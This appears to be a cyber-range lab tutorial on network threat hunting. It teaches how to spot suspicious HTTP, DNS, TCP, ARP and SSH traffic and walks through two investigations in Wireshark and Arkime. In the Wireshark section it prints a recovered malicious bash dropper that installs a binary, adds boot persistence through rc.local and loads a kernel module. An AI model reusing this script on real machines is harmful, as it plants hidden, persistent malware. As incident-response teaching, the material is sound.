#Defensive #LogAnalysis #NetworkLogs #Tools 

## **INTRODUCTION**

Threat hunting is a proactive tactic that aims to iteratively search through networks, endpoints, and datasets to hunt for malicious activity that would otherwise have gone undetected in a network. Using network analysis tools such as Arkime and Wireshark, you will see how we can closely monitor and understand network traffic to identify these anomalies.

After the initial compromise, attackers can remain inside the network, move laterally in the environment and go undetected for a really long time. Several organizations lack proper detection capabilities that can stop such advanced persistent threats from remaining in a network. This makes threat hunting an essential component of any defence strategy.

Although identifying of threats can be done automatically using various detection tools and SIEMS, sophisticated threats often go undetected and cannot be automated. Threat hunting aims to look into the detection of such malicious activity in the environment.

## **HUNTING FOR SUSPICIOUS TRAFFIC**

It is not feasible to analyze thousands of packets in a day looking for malicious activity, therefore, being able to differentiate between normal and suspicious traffic as a threat hunter is a key to determining whether a network has been compromised or an active attack is currently ongoing. Let us look into various networking protocols and what distinguishes normal traffic from suspicious traffic.

### 1. HTTP/HTTPS Traffic

HTTP provides a set of rules and standards that govern how information is transmitted over the web. It consists of a series of requests and responses known as messages that include a header and a body.

HTTP uses methods to carry out various activities.

### Suspicious HTTP/HTTPS traffic

If a network has been infected with malware, there are various indicators in HTTP traffic that could point to suspicious activity worth investigating:

1. **Non-standard port usage** - Malware (backdoors, web shells) could be communicated using ports that are not commonly used in HTTP (80,8080,8088). They could also be using standard ports because most are usually left open in network environments.
    
2. **Traffic encryption** - Encrypted traffic being sent over standard ports like port 80 and not **443** could indicate malicious traffic. Some malware types encrypt traffic that is being sent back to the attacker, while some transmit in plaintext
    
3. **FQDNs -** Typically in web traffic, the server will point to fully qualified domain names. Severs pointing to IP addresses hint at suspicious traffic that needs to be investigated.
    
4. **Downloads -** HTTP GET requests that end in extensions such as **.rar, .zip, .docm, .xls, .xlsm, .php** etc, indicate retrieval of files are also worth looking into as this could be legitimate malware being downloaded into the machine
    

Let us use Wireshark in this example to hunt for malicious HTTP traffic being sent in a network.

### 2. DNS Traffic

DNS is a protocol that works by translating domain names to machine-readable IP addresses. It is a query-response protocol that uses UDP on port 53. Normal DNS traffic only goes to DNS Servers.

### Suspicious DNS traffic

There are various types of DNS-related attacks. After the initial compromise, DNS data exfiltration is one of the post-exploitation activities that the attacker could execute where data is retrieved from a machine through the DNS protocol. Some suspicious DNS traffic could have the following:

1. **Non-standard protocol usage -** traffic being sent on port 53 using TCP protocol instead of UDP
    
2. **Non-standard destinations -** traffic not being sent to DNS servers. This could indicate exfiltration where traffic is being sent to an attacker-controlled server.
    
3. **Malformed DNS queries -** as DNS is a query-response protocol, several DNS Queries with no DNS responses or vice versa could indicate suspicious activity that warrants investigation.
    

### 3. TCP Traffic

TCP ensures that data is delivered from source to destination. It conducts a 3-way handshake before communication (SYN, SYN/ACK, AKC).

### Suspicious DNS traffic

1. Several SYN packets could indicate that a scan is being performed
    
2. A single host making requests to multiple ports/nodes could also indicate that a scan is being performed.
    

### 4. ARP Traffic

This protocol is used to map IP addresses to MAC addresses. ARP involves a request and response message. A request is represented by code 1 while a response is represented by code 2.

### Suspicious ARP traffic

1. Excessive ARP broadcast messages in a small time
    
2. 2 Identical MAC addresses in the ARP communications with different IP addresses. This could indicate ARP poisoning attacks.
    

### 5. SSH Traffic

SSH is a protocol that creates a secure communication channel between a local machine and a remote host, allowing access to resources, execution of commands, administrative and management tasks, etc.

### Suspicious SSH traffic

1. Excessive SSH traffic in a short time could indicate a brute-force attempt.
    

## **HUNTING FOR SUSPICIOUS FILES**

The presence of suspicious files in the network could lead to the discovery of malicious activity. Most malware activity could be traced back to malicious code executed on a system. These files could be **executables, office documents with macros, scripts,** etc. Since these files could be normal, one needs to be able to check for compromises in a system by examining downloaded files that are known to be associated with malware.

Requests ending with **.php** or **.png** are also worth looking into as they could contain embedded malware.

Let us look at some examples of suspicious file types

### 1. Archive Files

Attackers usually archive malware to make it look less suspicious or to evade common AV tools. After decompressing on a target, you may encounter executables or malicious scripts that can download the malware into your system

### 2. Executables

These are compiled files that can execute and perform given actions on a target system. Analysis usually requires reverse engineering to find out more about its operations and behaviour. By observing the headers as we will see in the lab section, you can identify malicious executables in the network.

### 3. Documents

Microsoft Office documents support embedding of Macros, which can execute code. Users can unintentionally download and open such files that lead to the execution of malware which evades common antivirus

### 4. Scripts

These are small programs that carry out given tasks. Malicious scripts could aid in downloading malware from the internet or carry out further post-compromise attacks

## **THREAT HUNTING WITH WIRESHARK**

Consider the scenario below:

> Iris is a company specializing in web application development. One of their client's web application is suspected to have been attacked. They hired Silensec to conduct a threat hunt on their environment to determine the root cause.

### Step 1: Determine the Trigger

Our trigger is based on the hypothesis of our threat hunt. A suspected attack was carried out in bringing the web app down, this is our hypothesis for study. Triggers could be IOCs, TTPs, and IOAs which we will have a look into.

### Step 2: Investigate

In this phase, we begin to carry out investigations. In our use-case, the Security team hired carried out a live capture of the network using Wireshark. The data that was captured is going to be our initial starting point for the threat hunt.

Navigate to the capture file as shown below:

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/d89d5c33_wireshark1.png)

Open the pcap file below, it will automatically open with Wireshark

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/a971f5e8_wireshark2.png)

Once Wireshark opens, you will be presented with the dashboard below showing the various traffic that was captured in the network to aid in the threat hunt.

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/5b6a6fc7_wireshark3.png)

Begin by browsing through the captured traffic. You will notice that there are various protocols being used in the network. We can check the protocols being used by navigating to the protocol hierachy

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/a7608c18_wireshark4.png)

You can see SSH and HTTP protocol have been used in the network capture.

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/a4b2cff4_wireshark5.png)

Let us look more into the SSH protocol. We can type our filter as shown below to get ssh traffic only

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/61d804e4_wireshark6.png)

Let's first understand what normal SSH traffic looks like.

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/40a2ec4c_wireshark7.png)

In the 4 sections indicate, the first one shows how the client and server negotiate a connection, the second shows how the client and server exchange public keys to generate a secret key, and the third section shows that the client acknowledges the "New Keys" and the last section are the encryption packets sent between the client and server before the session is then closed.

If you scroll further down, you can see the process is repeated several times.

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/66ba1aa8_wireshark8.png)

The requests are indeed suspicious as they happen in a short period of time, a span of seconds.

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/01a9aa96_wireshark9.png)

Let us dig further by looking into the Conversations.

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/6a0b8569_wireshark10.png)

Click on the TCP tab. You can sort the Bytes in any order for more visibility.

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/b7636abc_suspicious.png)

The packets highlighted 1 and 2 indicate several bytes were sent between the 2 servers hinting at a successful connection. In the section highlighted as 3, several interactions between the 2 hosts have a similar lengths of bytes. In comparison to the 1st and second sections, this indicates that several failed attempts took place.

You can also click "Limit to display filter" to select only ssh traffic (which we had specified in the display filter)

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/c7ad5c0a_wireshark11.png)

The threat hunter can further look into the access logs on the system to determine what credentials resulted in a successful authentication.

Let us also look into the HTTP protocol to determine whether suspicious activities were done.

Filter for http as shown and click on the first packet:

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/d38cbddc_wireshark12.png)

Expand the HTTP tab as shown:

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/759df20c_wireshark13.png)

The user agent hints that **wget** was used by the attacker who brute-forced into the server for possible post-compromise attacks. **wget** is commonly used to download content from the internet.

Since it is possible that files were downloaded, we can export objects in Wireshark and see what the attacker downloaded into the system.

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/de6ef0b5_wireshark14.png)

There are 3 interesting files with the name 1, 2 and 3

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/935955da_wireshark15.png)

We can save the file and see what type of files they are, this will give further insight whether malware was downloaded into the machine

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/a7716230_wireshark16.png)

Using the command **file** you can see 2 executables and a bash script. These are the malware in question

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/0b2c5ab3_wireshark17.png)

You can cat out the bash script

```
#!/bin/bash

mv 1 /var/mail/mail
chmod +x /var/mail/mail
echo -e "/var/mail/mail &\nsleep 1\npidof mail > /proc/dmesg\nexit 0" > /etc/rc.local
nohup /var/mail/mail > /dev/null 2>&1&
mv 2 /lib/modules/`uname -r`/sysmod.ko
depmod -a
echo "sysmod" >> /etc/modules
modprobe sysmod
sleep 1
pidof mail > /proc/dmesg
rm 3
```

Various operations were performed on the malware, such as ensuring it will start on boot in the script.

If we have a look again at the exported objects, we can see several bmp file formats with an IP address of **174.129.57.253.**

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/65b04171_wireshark18.png)

This could be an additional server being contacted by the malware to download more stuff.

This is an example of a threat hunting operation performed via Wireshark, let us have a look at how we can approach a threat hunt using Arkime

## **THREAT HUNTING WITH ARKIME**

Consider the scenario below:

> Silensec conducted a Threat Hunt for the organization with suspected malware infection.

Access Arkime's web interface, you will be presented with the dashboard below

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/1eb8266a_arkime1.png)

> The Threat Hunt was conducted in the year 2019

First, we are going to head over to the **SPIView** tab, this will give us more meta-data information regarding the captured traffic.

Let us adjust the time range to fit when the threat hunt was conducted.

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/52fd8f2b_arkime2.png)

We get the data below:

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/d91389c5_arkime3.png)

We can see a lot of traffic on various IPs, various protocols being used etc.

Let us add a field for destination ports to see which ports were being used in the communication. This can help us identify non-standard port usage that could indicate suspicious activity

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/960dc91c_arkime4.png)

You can see various ports being used in the communication

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/139051e4_arkime5.png)

We can begin by inspecting the HTTP traffic. Most infection begins here, a user could have unknowingly downloaded malware into their system while browsing the web.

Click on http -> **and** http

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/c770501b_arkime51.png)

Head over to the sessions tab

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/e7d77750_arkime60.png)

You will get http traffic as shown. Sort traffic by date by clicking on **"Start Time"**

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/c41d03ac_arkime6.png)

There are various requests going to different URIs that are worth looking into.

In one of the entries, we can see an HTTP request to www.dchristjan.com, that returns a zip file

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/f3580e48_arkime7.png)

Let us view one of the requests by clicking the plus icon

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/d036380b_arkime9.png)

You will get some metadata as shown below, pertaining to the traffic that was captured

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/0e9a74c1_arkime10.png)

You can also have a look at the contents of the source and destination headers by scrolling down, to view the requests and responses

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/3c6907fa_arkime11.png)

On the right we see some unreadable characters, this represents the information in the zip file which would have to be unzipped in order to get the readable content.

A useful feature in Arkime is the ability to download captured files across the network.

Head over to the packet options of that packet and click "Show Images & Files".

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/21106d3e_arkime12.png)

This will help us get the zip file that was downloaded

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/85f7b986_arkime9.png)

> The zip file has already been placed in the /home/kali/arkimelab/ folder for you

Head over to the file location and extract it

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/ac8b5590_arkime11.png)

Extract the nested zip file to end up with the **InvoiceAndStatement.lnk**

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/e490cfd1_arkime13.png)

To find out whether the file is malicious, you can use sha256sum to get the file hash and search on Virus Total

> Because the VM lacks internet by design, this will be done for you for demonstration purposes

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/2bb5907c_arkime14.png)

VirusTotal flags the file as malicious. This is the first downloaded file that was flagged as malicious in the network. We can analyze more traffic and see whether post-compromise attacks were performed on the machine

Head back to Arkime, some requests were made that returned **php** files. This could be indicators for malicious files being further downloaded, let us look further into it.

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/f5255792_arkime15.png)

Open one of the packets. In the packet options, click on "Hide Images & Files". This will allow us to see the header information of the file being downloaded.

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/1f3be458_arkime16.png)

Scroll to see the server response.

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/909d6286_arkime17.png)

"MZ This program cannot be run in DOS mode" is often seen in EXE or DLL files. This is an executable file that was downloaded after the initial compromise. You can see the name of the file below

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/cc6d5493_arkime18.png)

If the file was successfully executed in the target host, some traffic may have been generated for further communication with the attacker's machine. You would commonly see non-standard port usage that would hint at the post-exploitation activity.

Head back to the SPIView to check for non-standard ports.

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/04590747_arkime19.png)

Click on the **Dst Port** field to reveal the ports. Also, ensure the **protocols == http** filter has been removed from the search bar as shown. This will reveal all ports used in the various protocols

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/affbcaf9_arkime20.png)

There is the usage of ports 447, 443, 449 which is a common indicator of Trickbot malware activity.

Let us specify the **HTTP** protocol to see non-standard ports that were used for communication over the HTTP protocol

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/c490c342_arkime21.png)

You will get the following ports

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/4091c319_arkime22.png)

Let us select port 8082 as this is the non-standard port that is worth looking into.

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/14818ccb_arkime23.png)

Head back to the Sessions tab to investigate the packets

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/06eb324c_arkime24.png)

Open one of the packets.

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/c27bb260_arkime25.png)

The malware is using **proclist** and **sysinfo** to send information about the target to the attacker.

In another packet, the malware is also exfiltrating outlook passwords

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/515f4e16_arkime26.png)

Erase the ports filter from the search bar

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/3ae52e10_arkime27.png)

Scroll down the packet list. There are png files that were also downloaded.

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/ea107acc_arkime28.png)

Examine the packet information of one of the packets

![](https://cdn.cyberranges.com/public/user/63048870a85b7300073365c2/46552dd7_arkime29.png)

You can see the same signature we observed in one of the previous packets. Png files don't contain those headers, this indicates a malware file masked as a png.

## **CONCLUSION**

We have come to the end of the scenario, showcasing how Arkime and Wireshark can be useful tools in conducting threat hunts on a network level.